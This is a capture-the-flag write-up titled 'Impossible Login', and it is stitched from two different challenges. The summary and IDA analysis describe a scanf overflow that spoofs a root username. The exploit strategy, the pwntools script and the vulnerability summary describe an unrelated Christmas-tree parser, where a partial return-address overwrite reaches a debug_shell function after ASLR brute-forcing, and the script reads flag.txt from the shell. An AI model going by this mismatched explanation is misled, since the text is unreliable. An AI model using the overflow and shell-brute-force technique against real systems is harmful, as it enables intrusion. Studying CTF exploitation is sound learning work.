# Impossible Login - Writeup

---

## Challenge Description

![Alt text](img/1.png)

---

## Exploit Demo

This demo shows the exploitation flow:

![Alt text](gif/ImpossibleLogin.gif)

---

## Challenge Summary

The goal is to log in as `root`, which is normally blocked. Due to a stack overflow in the `password` input, it's possible to overwrite the `username` variable and bypass the restriction. By padding the password with `root` at the right offset, the program accepts the login and reveals the `root` flag.

## Binary Information

```bash
$ file logmein
```

![Alt text](img/2.png)

```bash
$ pwn checksec logmein
```

![Alt text](img/3.png)

---

## Static Analysis (IDA Pro)

In IDA Pro, the `main` function performs the following:

- Prompts for a **username** using `scanf("%s", username)` into a 24-byte buffer.
- If the input equals `"root"`, login is denied via `strncmp(username, "root", 4)`.
- Then prompts for a **password**, read into a 32-byte buffer (`scanf("%s", password)`).
- Both variables are stored on the stack; `username` is located just after `password`.
- The `login()` function compares the input credentials to a list stored in a global array `creds[]` using `strncmp()`.

![Alt text](img/4.png)

![Alt text](img/5.png)

Because `scanf` does not enforce length restrictions, inputting a long password overflows into `username`, allowing us to spoof `"root"` even if the original username wasn't `"root"`. The comparison uses `strncmp()` with the real length of `user/pass`, so partial matches suffice. If credentials match, `motd()` prints a personalized flag.

![Alt text](img/6.png)

---

## Exploit Strategy

Send a deeply nested, sparse tree string that causes the program to allocate a smaller buffer than needed. This triggers out-of-bounds writes on the stack, allowing partial overwrite of the return address. By placing specific characters at precise positions, the attacker overwrites the lower bytes of the return address to redirect execution to the hidden debug_shell() function. ASLR is bypassed by brute-forcing the unknown bits of the address, requiring multiple attempts to successfully gain a shell.

## Exploit Code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template christmas_tree.bin --host host5.metaproblems.com --port 7521
from pwn import *
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'christmas_tree.bin')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'host5.metaproblems.com'
port = int(args.PORT or 7521)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)



while True:
    io = start()


    io.recvuntil(b'Welcome! What would you like to do? : ')
    io.sendline(b"display")
    io.recvuntil(b'Please enter your encoded christmas tree : ')
    io.sendline(b"0()(1()(2()(3(4(()(i))((S)()))())))")
    for i in range(3) :
        io.recvline()

    try:
        io.sendline(b"cat flag.txt")
        flag = io.recvline().strip()
        #log.success(f"FLAG : {flag.decode()}")
        log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")

        break

    except:
        io.close()


```

---

## Exploit Output

![Alt text](img/7.png)

---

## Vulnerability Summary

The binary parses strings representing binary trees and stores them in a stack-allocated array. It calculates the required buffer size by counting the number of nodes and assuming the tree is fully balanced. However, this logic fails when the tree is **deep and sparse** (e.g., having only right children), where the **depth exceeds the allocated array size**.

As a result, during deserialization, the program writes **beyond the bounds of the stack buffer**, causing a **stack-based buffer overflow**. Because the stack layout places the return address near the end of the array, carefully crafted input can be used to **partially overwrite the return address**. Although stack canaries are present and **ASLR is enabled**, the attacker leverages:

- **A hidden `debug_shell()` function** (ret2win-style exploitation).
- **Partial return address overwrite** (only lower 2 bytes needed).
- **Brute-force guessing** (\~16 tries on average due to 4 bits of entropy).

This leads to reliable control of execution flow and ultimately a shell, allowing retrieval of the flag.

---

## Flag

```
MetaCTF{0h_chr1stm4s_tr33_h0w_l0v3ly_4r3_y0ur_br4nch3s}
```
